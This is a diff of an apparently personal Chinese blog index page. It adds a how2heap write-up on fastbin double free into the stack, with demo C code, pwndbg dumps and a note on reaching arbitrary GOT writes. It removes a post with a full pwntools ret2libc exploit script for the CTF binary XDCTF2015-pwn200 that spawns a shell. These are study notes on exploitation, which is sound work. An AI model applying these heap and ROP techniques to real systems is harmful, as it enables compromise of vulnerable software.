@@ -251,6 +251,149 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/fastbin_dup_into_stack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/06/fastbin_dup_into_stack/" itemprop="url">fastbin_dup_into_stack</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-06T23:21:13+08:00">
+                2019-08-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/how2heap/" itemprop="url" rel="index">
+                    <span itemprop="name">how2heap</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-源代码"><a href="#0x01-源代码" class="headerlink" title="0x01 源代码"></a>0x01 源代码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">	unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"The address we want malloc() to return is %p.\n"</span>, 8+(char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	int *a = malloc(8);</span><br><span class="line">	int *b = malloc(8);</span><br><span class="line">	int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	fprintf(stderr, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	fprintf(stderr, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	// free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	free(b);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	fprintf(stderr, <span class="string">"2nd malloc(8): %p\n"</span>, malloc(8));</span><br><span class="line">	fprintf(stderr, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	fprintf(stderr, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, malloc(8));</span><br><span class="line">	fprintf(stderr, <span class="string">"4th malloc(8): %p\n"</span>, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-理解"><a href="#0x02-理解" class="headerlink" title="0x02 理解"></a>0x02 理解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">程序通用malloc了三个chunk，紧接着通过fastbin double free的操作形成了如下freelist。</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20：0x603000-▸0x603020◂-0x603000</span><br><span class="line">0x30：0x0</span><br><span class="line">0x40：0x0</span><br><span class="line">0x50：0x0</span><br><span class="line">0x60：0x0</span><br><span class="line">0x70：0x0</span><br><span class="line">0x80：0x0</span><br><span class="line"></span><br><span class="line">unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	fprintf(stderr, <span class="string">"2nd malloc(8): %p\n"</span>, malloc(8));</span><br><span class="line">	fprintf(stderr, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	fprintf(stderr, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">malloc chunk d</span><br><span class="line"></span><br><span class="line">这个时候程序会从fastbins里取一个，由于fastbins是LIFO（Last <span class="keyword">in</span> First out）.chunk A会被取出使用。倘若我们这个时候能对chunk D进行操作，如d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));由于stack_var = 0x20;这样的定义是在函数内，所以stack_var的地址将在栈上，通过对指针d的操作，我们可以伪造一个chunk，并将这个chunk放在栈上。</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/20a 0x603000</span><br><span class="line">0x603000:   0x0 0x21</span><br><span class="line">0x603010:   0x7fffffffe388  0x0</span><br><span class="line">0x603020:   0x0 0x21</span><br><span class="line">0x603030:   0x603000    0x0</span><br><span class="line">0x603040:   0x0 0x21</span><br><span class="line">0x603050:   0x0 0x0</span><br><span class="line">0x603060:   0x0 0x20fa1</span><br><span class="line">0x603070:   0x0 0x0</span><br><span class="line">0x603080:   0x0 0x0</span><br><span class="line">0x603090:   0x0 0x0</span><br><span class="line">Pwndbg&gt; x/20a 0x7fffffffe388</span><br><span class="line">0x7fffffffe388: 0x40097c &lt;main+758&gt; 0x20</span><br><span class="line">0x7fffffffe398: 0x603010    0x603030</span><br><span class="line">0x7fffffffe3a8: 0x603050    0x603010</span><br><span class="line">0x7fffffffe3b8: 0xc3e158ae04ceee00  0x4009a0 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffe3c8: 0x7ffff7a303f1 &lt;__libc_start_main+241&gt;  0x40000</span><br><span class="line">0x7fffffffe3d8: 0x7fffffffe4a8  0x1f7b9a488</span><br><span class="line">0x7fffffffe3e8: 0x400686 &lt;main&gt; 0x0</span><br><span class="line">0x7fffffffe3f8: 0x4ffa6e8ae3316c56  0x400590 &lt;_start&gt;</span><br><span class="line">0x7fffffffe408: 0x7fffffffe4a0  0x0</span><br><span class="line">0x7fffffffe418: 0x0 0xb00591f537d16c56</span><br><span class="line">Pwndbg&gt; stack 10</span><br><span class="line">00:0000│ rsp  0x7fffffffe390 ◂— 0x20 /* <span class="string">' '</span> */</span><br><span class="line">01:0008│      0x7fffffffe398 —▸ 0x603010 —▸ 0x7fffffffe388 —▸ 0x40097c (main+758) ◂— 0x4d8b4800000000b8</span><br><span class="line">02:0010│      0x7fffffffe3a0 —▸ 0x603030 —▸ 0x603000 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffe3a8 —▸ 0x603050 ◂— 0x0</span><br><span class="line">04:0020│      0x7fffffffe3b0 —▸ 0x603010 —▸ 0x7fffffffe388 —▸ 0x40097c (main+758) ◂— 0x4d8b4800000000b8</span><br><span class="line">05:0028│      0x7fffffffe3b8 ◂— 0xc3e158ae04ceee00</span><br><span class="line">06:0030│ rbp  0x7fffffffe3c0 —▸ 0x4009a0 (__libc_csu_init) ◂— 0x41ff894156415741</span><br><span class="line">07:0038│      0x7fffffffe3c8 —▸ 0x7ffff7a303f1 (__libc_start_main+241) ◂— mov    edi, eax</span><br><span class="line">08:0040│      0x7fffffffe3d0 ◂— 0x40000</span><br><span class="line">09:0048│      0x7fffffffe3d8 —▸ 0x7fffffffe4a8 —▸ 0x7fffffffe6ea ◂— 0x77732f656d6f682f (<span class="string">'/home/sw'</span>)</span><br><span class="line"></span><br><span class="line">stack_var = 0x20; 是由于伪造的chunk要由设置size，size的位置位于地址-0x8的地方。</span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line"></span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (<span class="keyword">in</span> this <span class="keyword">case</span>, the stack).</span><br><span class="line">The address we want malloc() to <span class="built_in">return</span> is 0x7fff02a085c8.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x146b010</span><br><span class="line">2nd malloc(8): 0x146b030</span><br><span class="line">3rd malloc(8): 0x146b050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x146b010 again, things will crash because 0x146b010 is at the top of the free list.</span><br><span class="line">So, instead, we<span class="string">'ll free 0x146b030.</span></span><br><span class="line"><span class="string">Now, we can free 0x146b010 again, since it'</span>s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x146b010, 0x146b030, 0x146b010 ]. We<span class="string">'ll now carry out our attack by modifying data at 0x146b010.</span></span><br><span class="line"><span class="string">1st malloc(8): 0x146b010</span></span><br><span class="line"><span class="string">2nd malloc(8): 0x146b030</span></span><br><span class="line"><span class="string">Now the free list has [ 0x146b010 ].</span></span><br><span class="line"><span class="string">Now, we have access to 0x146b010 while it remains at the head of the free list.</span></span><br><span class="line"><span class="string">so now we are writing a fake free size (in this case, 0x20) to the stack,</span></span><br><span class="line"><span class="string">so that malloc will think there is a free chunk there and agree to</span></span><br><span class="line"><span class="string">return a pointer to it.</span></span><br><span class="line"><span class="string">Now, we overwrite the first 8 bytes of the data at 0x146b010 to point right before the 0x20.</span></span><br><span class="line"><span class="string">3rd malloc(8): 0x146b010, putting the stack address on the free list</span></span><br><span class="line"><span class="string">4th malloc(8): 0x7fff02a085c8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最后效果如上，我们发现当chunk a被拿出来后，由于我们伪造了chunk a的fd，造成如下效果。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Pwndbg&gt; fastbins</span></span><br><span class="line"><span class="string">fastbins</span></span><br><span class="line"><span class="string">0x20：0x603000-▸0x7fffffffe388-▸0x603010◂-0x0</span></span><br><span class="line"><span class="string">0x30：0x0</span></span><br><span class="line"><span class="string">0x40：0x0</span></span><br><span class="line"><span class="string">0x50：0x0</span></span><br><span class="line"><span class="string">0x60：0x0</span></span><br><span class="line"><span class="string">0x70：0x0</span></span><br><span class="line"><span class="string">0x80：0x0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这个时候形成如上的链表结构，这个时候当我们再malloc一块内存的时候，系统会误以为是我们假的chunk是自的的。他会把这块chunk拿出来用。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Pwndbg&gt; heap</span></span><br><span class="line"><span class="string">Top Chunk: 0x603060</span></span><br><span class="line"><span class="string">Last Remainder: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x603000 FASTBIN &#123;</span></span><br><span class="line"><span class="string">  prev_size = 0x0,</span></span><br><span class="line"><span class="string">  size = 0x21,</span></span><br><span class="line"><span class="string">  fd = 0x7fffffffe388,</span></span><br><span class="line"><span class="string">  bk = 0x0,</span></span><br><span class="line"><span class="string">  fd_nextsize = 0x0,</span></span><br><span class="line"><span class="string">  bk_nextsize = 0x21</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">0x603020 FASTBIN &#123;</span></span><br><span class="line"><span class="string">  prev_size = 0x0,</span></span><br><span class="line"><span class="string">  size = 0x21,</span></span><br><span class="line"><span class="string">  fd = 0x603000,</span></span><br><span class="line"><span class="string">  bk = 0x0,</span></span><br><span class="line"><span class="string">  fd_nextsize = 0x0,</span></span><br><span class="line"><span class="string">  bk_nextsize = 0x21</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">小结：对于 fastbins，可以通过 double-free 覆盖 fastbins 的结构，来获得一个指向任意地址的指针。如果我们把这个地址指向 got 地址，如果我们可对 chunk 进行写或者读操作，我们就有了任意地址写 和 任意地址读。</span></span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/uaf漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1577,160 +1720,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/rop2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/28/rop2/" itemprop="url">rop2</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-28T19:46:21+08:00">
-                2019-07-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/百度学习/" itemprop="url" rel="index">
-                    <span itemprop="name">百度学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>原文链接：<a href="https://blog.csdn.net/zszcr/article/details/79659071" target="_blank" rel="noopener">https://blog.csdn.net/zszcr/article/details/79659071</a></p>
-<h3 id="DynELF模块"><a href="#DynELF模块" class="headerlink" title="DynELF模块"></a>DynELF模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pwn题的无libc泄露用到的pwntools的DynELF模块</span><br><span class="line"></span><br><span class="line">实现条件是：</span><br><span class="line"></span><br><span class="line">有指向libc空间的 能泄露libc空间信息的函数 （write和puts函数）</span><br><span class="line"></span><br><span class="line">能重复触发漏洞</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DynELF模块的基本框架：</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./xxx'</span>)</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line">    payload=<span class="string">'xxx'</span>+address+<span class="string">'xxx'</span>  <span class="comment">#address就是你要泄露的地址 ，payload是你控制程序泄露出address处的信息的攻击代码</span></span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    leaked=p.recv(4)<span class="comment">#接受的字节要看程序是32位还是64位来决定 ，32位接受4个字节的数据 而64位接受8个字节的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">"[%s] -&gt;[%s]=[%s]"</span> % (hex(address),hex(u32(leaked)),repr(leaked))<span class="comment">#输出泄露的信息</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> leaked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dynelf = DynELF(leak,elf=ELF(<span class="string">'./xxx'</span>)) <span class="comment">#初始化DynELF模块</span></span><br><span class="line"></span><br><span class="line">system = dynelf.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">你可以用DynELF模块搜索到system或者是execv函数在内存中地址 但是不能找到<span class="string">"/bin/sh"</span>字符串</span><br><span class="line"></span><br><span class="line">所以<span class="string">"/bin/sh"</span>要自己写入 bss段 </span><br><span class="line"></span><br><span class="line">因为我只做过write函数泄露的题 ，就先写怎么用write函数来实现 puts函数等以后做到了再补上</span><br><span class="line"></span><br><span class="line">write函数原型是 write(1,address,len) <span class="comment">#1表示标准输出流 ，address是write函数要输出信息的地址 ，而len表示输出长度</span></span><br><span class="line"></span><br><span class="line">所以说我们要构造的payload一般是</span><br><span class="line"></span><br><span class="line">x86</span><br><span class="line"></span><br><span class="line">payload=junk+<span class="string">'fakeebp'</span>+p32(write_plt)+p32(return_function)+p32(1)+p32(address)+p32(4)</span><br><span class="line"></span><br><span class="line">amd64</span><br><span class="line"></span><br><span class="line">payload=junk+<span class="string">"fakerbp"</span>+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(address)+p64(pop_rdx)+p64(8)+p64(write_plt)+p64(return_address)</span><br></pre></td></tr></table></figure>
-
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XDCTF2015-pwn200</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdn.net/20180322200957722" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">检查了下防护机制 发现开启了堆栈不可执行 所以不可以在栈上插入shellcode</span><br><span class="line"></span><br><span class="line">同时在用ROPgadget搜索了下system函数和<span class="string">"/bin/sh"</span> 发现找不到 </span><br><span class="line"></span><br><span class="line">简单运行下发 它输出了一句话 和让我输入一串字符串</span><br><span class="line"></span><br><span class="line">用ida反汇编</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdn.net/20180322201423470" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以发现write函数在plt和got都存在，同时还有<span class="built_in">read</span>函数</span><br><span class="line"></span><br><span class="line">我们就可以用write函数来泄露libc内存空间 ，借助DynELF模块来得到system函数的地址</span><br><span class="line"></span><br><span class="line">向bss段写入<span class="string">"/bin/sh\x00"</span>字符串 然后调用system函数就行了</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&apos;./xdctf15-pwn200&apos;)</span><br><span class="line">elf=ELF(&apos;./xdctf15-pwn200&apos;)</span><br><span class="line"></span><br><span class="line">write_plt=elf.symbols[&apos;write&apos;]</span><br><span class="line">write_got=elf.got[&apos;write&apos;]</span><br><span class="line">read_plt=elf.symbols[&apos;read&apos;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">start=0x080483D0</span><br><span class="line">main=0x080484BE</span><br><span class="line">def leak(address):</span><br><span class="line">        payload=&apos;a&apos;*(0x6c+4)+p32(write_plt)+p32(start)+p32(1)+p32(address)+p32(4)</span><br><span class="line">        p.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">p.send(payload)</span><br><span class="line">leaked=p.recv(4)</span><br><span class="line">print &quot;[%s] -&gt; [%s] = [%s]&quot; % (hex(address),hex(u32(leaked)),repr(leaked))</span><br><span class="line">return leaked</span><br><span class="line">d=DynELF(leak,elf=ELF(&apos;./xdctf15-pwn200&apos;))</span><br><span class="line">system=d.lookup(&apos;system&apos;,&apos;libc&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##use pppret  来保持栈平衡 ：调用子程序时先保存堆栈信息（某些堆栈相关的寄存器），待子程序返回后将堆栈恢复到调用前的状态（堆栈用于保存局部变量、函数参数等重要信息），以保证程序能够继续正确运行</span><br><span class="line"></span><br><span class="line">payload2=&apos;a&apos;*(0x6c+4)+p32(read_plt)+p32(0x080485cd)+p32(0)+p32(bss)+p32(8)</span><br><span class="line"></span><br><span class="line">payload2+=p32(system)+p32(0xdeadbeef)+p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.send(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1781,7 +1770,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
